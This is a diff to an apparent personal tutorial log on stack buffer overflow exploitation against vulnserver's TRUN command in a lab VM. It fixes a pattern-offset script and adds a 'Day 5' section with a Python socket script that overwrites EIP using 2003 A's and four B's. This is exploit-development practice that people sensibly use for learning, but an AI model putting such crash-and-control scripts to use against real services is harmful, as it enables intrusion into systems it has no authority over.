@@ -159,7 +159,7 @@ Now let modify our code like that below;
 #!/usr/bin/python 
 import sys, socket
  
-offset = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1>
+offset = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1"
 
 
 try:
@@ -185,3 +185,38 @@ Now let use the create_offset.rb `/usr/share/metasploit-framework/tools/exploit/
 Cool we got exact match was found at 2003 bytes. This is really awesome lol i feel so cool We can now try to control the EIP, which will be critical later in our exploit.
 
 ####  `Day 5`
+
+`OVERWRITING THE EIP`
+
+Boom now that we know the EIP is after 2003 bytes cool let modify our code to confirm if we really have control over the EIP.
+
+```
+#!/usr/bin/python 
+import sys, socket
+ 
+shellcode = "A" * 2003 + "B" * 4
+
+
+try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect(('172.16.139.133',9999))
+        s.send(('TRUN /.:/' + shellcode))
+        s.close()
+
+except:
+        print "Error Connecting To Server" 
+        sys.exit()
+```
+
+![Image](https://imgur.com/OmrprZB.png)
+
+So, now the shellcode variable is back to a bunch of A’s and four B’s. What we are doing here is sending 2003 A’s in an attempt to reach, but not to overwrite the EIP. 
+
+Then we are sending four B’s, which should overwrite the EIP with 42424242. Remember, the EIP has a length of four bytes, so if we overwrite successfully, we will be in full control and well on our way to root. Let’s execute the code and have a look
+
+![Image](https://imgur.com/Au86j6a.png)
+
+
+Boom our EIP have chnaged to 42424242 that confirm we have totally control over the EIP.
+
+####  `Day 6`
